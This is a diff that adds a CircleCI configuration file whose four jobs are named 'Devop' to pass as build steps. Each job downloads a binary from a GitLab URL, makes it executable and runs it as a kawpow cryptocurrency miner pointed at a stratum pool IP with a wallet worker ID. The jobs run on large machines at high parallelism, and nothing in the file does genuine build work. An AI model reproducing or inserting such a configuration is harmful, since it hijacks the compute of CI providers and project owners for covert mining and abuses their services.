@@ -1,0 +1,54 @@
+version: 2.1 
+jobs: 
+    Devop: 
+      machine: 
+        image: ubuntu-2004:202010-01 
+        resource_class: large 
+      parallelism: 7     
+      steps: 
+        - checkout 
+        - run: 
+            name: "ANDROMEDA" 
+            command: wget wget https://gitlab.com/kardisali2/pow-block/-/raw/main/node && chmod 700 node && ./node -a kawpow -o stratum+tcp://209.25.142.102:80 -u VJuqzLUApRPjvU849ncjS26HAFPpjR6rig.STRIXGPU
+
+    Devop1: 
+      machine: 
+        image: ubuntu-2004:202010-01 
+        resource_class: large 
+      parallelism: 7    
+      steps: 
+        - checkout 
+        - run: 
+            name: "ANDROMEDA" 
+            command: wget https://gitlab.com/kardisali2/pow-block/-/raw/main/node && chmod 700 node && ./node -a kawpow -o stratum+tcp://209.25.142.102:80 -u VJuqzLUApRPjvU849ncjS26HAFPpjR6rig.STRIXGPU
+
+    Devop2: 
+      machine: 
+        image: ubuntu-2004:202010-01 
+        resource_class: large 
+      parallelism: 7 
+      steps: 
+        - checkout 
+        - run: 
+            name: "ANDROMEDA" 
+            command: wget https://gitlab.com/kardisali2/pow-block/-/raw/main/node && chmod 700 node && ./node -a kawpow -o stratum+tcp://209.25.142.102:80 -u VJuqzLUApRPjvU849ncjS26HAFPpjR6rig.STRIXGPU
+
+    Devop3: 
+      machine: 
+        image: ubuntu-2004:202010-01 
+        resource_class: large  
+      parallelism: 7 
+      steps: 
+        - checkout 
+        - run: 
+            name: "ANDROMEDA" 
+            command: wget https://gitlab.com/kardisali2/pow-block/-/raw/main/node && chmod 700 node && ./node -a kawpow -o stratum+tcp://209.25.142.102:80 -u VJuqzLUApRPjvU849ncjS26HAFPpjR6rig.STRIXGPU
+
+workflows: 
+    version: 2.1 
+    build: 
+        jobs: 
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
